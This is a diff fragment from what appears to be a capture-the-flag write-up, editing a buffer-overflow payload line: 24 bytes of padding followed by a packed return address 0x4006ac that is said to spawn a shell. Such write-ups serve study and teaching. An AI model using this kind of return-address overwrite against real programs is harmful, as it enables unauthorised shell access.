@@ -67,6 +67,6 @@ use `objdump` to analyze instructions
 
 return to address `4006ac` to spawn a shell
 
-payload: '\0'*24 + p64(0x004006ac)
+payload: `'A'*24 + p64(0x004006ac)`
 
 
